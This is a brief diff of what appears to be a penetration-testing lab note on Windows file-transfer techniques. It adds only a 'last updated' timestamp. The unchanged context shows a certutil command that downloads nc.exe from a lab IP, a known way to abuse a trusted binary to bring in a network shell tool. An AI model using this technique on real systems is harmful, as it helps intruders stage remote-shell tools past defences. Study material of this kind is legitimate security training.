@@ -89,3 +89,6 @@ Casey Smith (@subTee) found that certutil can be used to download arbitrary file
 ```powershell
 C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
